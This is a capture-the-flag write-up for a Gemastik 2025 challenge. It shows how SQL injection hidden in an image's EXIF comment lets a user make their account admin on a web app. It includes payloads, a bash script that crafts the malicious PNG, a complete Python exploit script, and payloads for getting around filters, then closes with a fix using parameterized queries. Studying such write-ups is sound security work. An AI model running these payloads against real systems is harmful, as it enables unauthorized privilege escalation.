# Privilege Escalation to Admin Role

## Question: Can we become admin?

**YES!** While the command injection is the intended/easier path, you can also exploit the **SQL Injection** vulnerability to escalate your privileges to admin and view the flag directly on the profile page.

## The Vulnerability

```python:193:194:/home/sandwicheese/ctf-writeups/Gemastik 2025 Final/blogpost/app.py
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)
```

The `metadata_text` comes from exiftool output, which reads EXIF data from the uploaded image. We can craft an image with malicious EXIF data containing SQL injection payload!

## Exploitation Strategy

### Method 1: Update Existing User to Admin

1. **Register and login** as normal user
2. **Create image with malicious EXIF data** containing SQL injection:
   ```sql
   '; UPDATE users SET role = 'admin' WHERE username = 'your_username'; --
   ```
3. **Upload the image** via `/create` endpoint
4. **SQL injection executes**, updating your role to 'admin'
5. **Visit `/profile`** to see the flag!

### Method 2: Create New Admin User (Alternative)

Inject SQL to create a new admin user:

```sql
'; INSERT INTO users (username, password, role) VALUES ('adminpwn', '<hash>', 'admin'); --
```

## Step-by-Step Exploitation

### Step 1: Craft Malicious Image

```bash
#!/bin/bash

# Install exiftool if not already installed
# apt-get install libimage-exiftool-perl

# Create a valid PNG
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82' > exploit.png

# Your username (the one you registered with)
USERNAME="hacker123"

# SQL injection payload
PAYLOAD="'; UPDATE users SET role = 'admin' WHERE username = '${USERNAME}'; --"

# Inject into EXIF Comment field
exiftool -Comment="$PAYLOAD" exploit.png

# Verify it was injected
exiftool exploit.png | grep Comment
```

### Step 2: Upload the Malicious Image

```python
import requests

TARGET = "http://localhost:10000"
USERNAME = "hacker123"
PASSWORD = "password123"

session = requests.Session()

# Register
session.post(f"{TARGET}/register", data={
    "username": USERNAME,
    "password": PASSWORD
})

# Login
session.post(f"{TARGET}/login", data={
    "username": USERNAME,
    "password": PASSWORD
})

# Upload image with SQL injection in EXIF
with open("exploit.png", "rb") as f:
    files = {"image": ("exploit.png", f, "image/png")}
    data = {
        "title": "Test Post",
        "content": "This is a test"
    }
    r = session.post(f"{TARGET}/create", data=data, files=files)
    print(f"Upload status: {r.status_code}")

# Check if we're admin now
r = session.get(f"{TARGET}/profile")
if "FLAG" in r.text or "GEMASTIK{" in r.text:
    print("✓ Privilege escalation successful!")
    # Extract flag
    import re
    flag = re.search(r'GEMASTIK\{[^}]+\}', r.text)
    if flag:
        print(f"Flag: {flag.group(0)}")
else:
    print("✗ Privilege escalation failed")
    print(r.text)
```

### Step 3: Access Admin Profile

```bash
# After uploading the malicious image
curl http://localhost:10000/profile -b cookies.txt

# Should now show:
# Role: admin
# FLAG (admin only):
# GEMASTIK{...}
```

## Why This Works

1. **EXIF data is user-controlled**: We can set arbitrary EXIF metadata
2. **exiftool outputs EXIF data**: The Comment field will contain our SQL payload
3. **No sanitization**: `metadata_text` is directly concatenated into SQL
4. **executescript() allows multiple statements**: Semicolon can execute additional queries
5. **Single quotes can break out**: The `'{metadata_text}'` allows SQL injection

## The SQL Execution Flow

```python
# When you upload the image:
metadata_text = exiftool_output  # Contains: '; UPDATE users SET role = 'admin' WHERE username = 'hacker123'; --

# The vulnerable code creates:
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"

# Which becomes:
UPDATE posts SET metadata = '
  ... exif data ...
  Comment: '; UPDATE users SET role = 'admin' WHERE username = 'hacker123'; --
  ... more exif data ...
' WHERE id = 1;

# When executed with executescript(), it runs:
# 1. UPDATE posts SET metadata = '...' WHERE id = 1;
# 2. UPDATE users SET role = 'admin' WHERE username = 'hacker123';  ← OUR INJECTION
# 3. -- (comment) rest of the query
```

## Full Exploit Script

```python
#!/usr/bin/env python3
"""
Privilege Escalation via SQL Injection in EXIF metadata
Alternative method to get the flag without command injection
"""

import re
import sys
import subprocess
import requests
from pathlib import Path

def create_exploit_image(username, output_path="exploit.png"):
    """Create PNG with malicious EXIF data"""

    # Minimal valid PNG (1x1 pixel)
    png_bytes = (
        b'\x89PNG\r\n\x1a\n'
        b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
        b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4'
        b'\x00\x00\x00\x00IEND\xaeB`\x82'
    )

    with open(output_path, "wb") as f:
        f.write(png_bytes)

    # SQL injection payload to escalate privileges
    # Note: We need to escape quotes properly for exiftool
    payload = f"'; UPDATE users SET role = 'admin' WHERE username = '{username}'; --"

    # Inject into EXIF Comment field
    try:
        result = subprocess.run(
            ["exiftool", f"-Comment={payload}", output_path, "-overwrite_original"],
            capture_output=True,
            text=True,
            check=True
        )
        print(f"[+] Created exploit image with SQL injection")
        print(f"[+] Payload: {payload}")
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to inject EXIF: {e}")
        print(f"[!] Make sure exiftool is installed: apt-get install libimage-exiftool-perl")
        return False
    except FileNotFoundError:
        print(f"[!] exiftool not found. Install it: apt-get install libimage-exiftool-perl")
        return False

def exploit(target, username, password):
    """Execute privilege escalation exploit"""

    session = requests.Session()

    print(f"[*] Target: {target}")
    print(f"[*] Username: {username}")

    # Register
    print("[*] Registering user...")
    r = session.post(f"{target}/register", data={
        "username": username,
        "password": password
    }, allow_redirects=True)

    if r.status_code == 200:
        print("[+] Registration successful")
    else:
        print(f"[!] Registration failed or user exists (continuing anyway)")

    # Login
    print("[*] Logging in...")
    r = session.post(f"{target}/login", data={
        "username": username,
        "password": password
    }, allow_redirects=True)

    if "Logged in" in r.text or r.status_code == 200:
        print("[+] Login successful")
    else:
        print("[!] Login failed")
        return False

    # Create exploit image
    exploit_path = "exploit_sqli.png"
    if not create_exploit_image(username, exploit_path):
        return False

    # Upload exploit image
    print("[*] Uploading exploit image...")
    with open(exploit_path, "rb") as f:
        files = {"image": (exploit_path, f, "image/png")}
        data = {
            "title": "Privilege Escalation",
            "content": "SQL Injection via EXIF metadata"
        }
        r = session.post(f"{target}/create", data=data, files=files, allow_redirects=True)

    if r.status_code == 200:
        print("[+] Image uploaded, SQL injection should have executed")
    else:
        print(f"[!] Upload failed: {r.status_code}")
        return False

    # Check if we're admin now
    print("[*] Checking if privilege escalation worked...")
    r = session.get(f"{target}/profile")

    # Look for flag in response
    flag_match = re.search(r'GEMASTIK\{[^\}]{1,200}\}', r.text)

    if flag_match:
        print("\n" + "="*60)
        print("✓ PRIVILEGE ESCALATION SUCCESSFUL!")
        print("="*60)
        print(f"\nFLAG: {flag_match.group(0)}")
        print("\n" + "="*60)
        return True
    elif "Role: admin" in r.text or "role\">admin" in r.text:
        print("[+] User is now admin, but flag not found in response")
        print("[*] Response excerpt:")
        print(r.text[:500])
        return True
    else:
        print("[!] Privilege escalation failed")
        print("[*] Current role still appears to be 'user'")
        if "Role: user" in r.text:
            print("[!] SQL injection did not execute successfully")
            print("[*] This might be due to:")
            print("    - EXIF data being sanitized")
            print("    - Quotes being escaped")
            print("    - Different SQL syntax needed")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port] [username] [password]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 10000")
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "10000"
    username = sys.argv[3] if len(sys.argv) > 3 else "sqli_user"
    password = sys.argv[4] if len(sys.argv) > 4 else "sqli_pass123"

    target = f"http://{host}:{port}"

    success = exploit(target, username, password)
    sys.exit(0 if success else 1)
```

## Comparison: SQL Injection vs Command Injection

| Aspect           | SQL Injection (Admin Path)   | Command Injection (File Path) |
| ---------------- | ---------------------------- | ----------------------------- |
| **Difficulty**   | Medium-Hard                  | Easy-Medium                   |
| **Requirements** | exiftool on attacker machine | Just curl or Python           |
| **Steps**        | 4-5 steps                    | 5-6 steps                     |
| **Reliability**  | May fail if EXIF sanitized   | Very reliable                 |
| **Stealth**      | Slightly more stealthy       | Obvious file manipulation     |
| **Flag Access**  | Direct (via profile page)    | Indirect (via file overwrite) |

## Potential Issues and Workarounds

### Issue 1: Single Quote Escaping

If single quotes are escaped in EXIF output, try:

```sql
-- Using double quotes (SQLite supports both)
"; UPDATE users SET role = "admin" WHERE username = "user"; --

-- Using char() function
'; UPDATE users SET role = char(97,100,109,105,110) WHERE username = 'user'; --

-- Using hex encoding
'; UPDATE users SET role = x'61646d696e' WHERE username = 'user'; --
```

### Issue 2: EXIF Field Too Short

Try different EXIF fields:

```bash
# Try Comment
exiftool -Comment="$PAYLOAD" exploit.png

# Try UserComment
exiftool -UserComment="$PAYLOAD" exploit.png

# Try Description
exiftool -Description="$PAYLOAD" exploit.png

# Try Multiple fields
exiftool -Comment="$PAYLOAD" -Description="$PAYLOAD" exploit.png
```

### Issue 3: executescript() Limitations

The `executescript()` method might have limitations. Alternative approach:

```sql
-- Use UNION to leak data first
'; SELECT 1; UPDATE users SET role='admin' WHERE id=1; --

-- Or use multiple semicolons
'; ; UPDATE users SET role='admin'; ; --
```

## Verification

### Check Your Role

```bash
# Login and check profile
curl http://target:port/profile -b cookies.txt | grep -i "role"

# Should show: Role: admin
```

### Check Database Directly (if you have access)

```bash
sqlite3 /data/app.db "SELECT id, username, role FROM users;"
```

## Defense

### Fix the SQL Injection

```python
# BEFORE (vulnerable)
metadata_insert = f"UPDATE posts SET metadata = '{metadata_text}' WHERE id = {post_id};"
db.executescript(metadata_insert)

# AFTER (secure)
db.execute("UPDATE posts SET metadata = ? WHERE id = ?", (metadata_text, post_id))
db.commit()
```

### Additional Protections

1. **Sanitize EXIF output** before storing:

   ```python
   metadata_text = metadata_text.replace("'", "''")  # Escape quotes
   # Or better: just use parameterized queries
   ```

2. **Limit EXIF fields** stored:

   ```python
   # Only store safe fields
   allowed_fields = ['Width', 'Height', 'FileType']
   # Parse and filter exiftool output
   ```

3. **Don't use executescript()** - it allows multiple statements:
   ```python
   # Use execute() instead
   db.execute(query, params)
   ```

## Conclusion

While the **command injection** path is easier and more reliable, the **SQL injection** path is also viable for privilege escalation. This demonstrates defense-in-depth is crucial - a single vulnerability (command injection) was enough, but multiple vulnerabilities compound the risk!

The SQL injection requires:

1. Understanding how EXIF metadata flows into SQL
2. Crafting proper SQL injection payloads
3. Using exiftool to inject metadata

Both paths lead to the flag, but command injection is the intended solution.

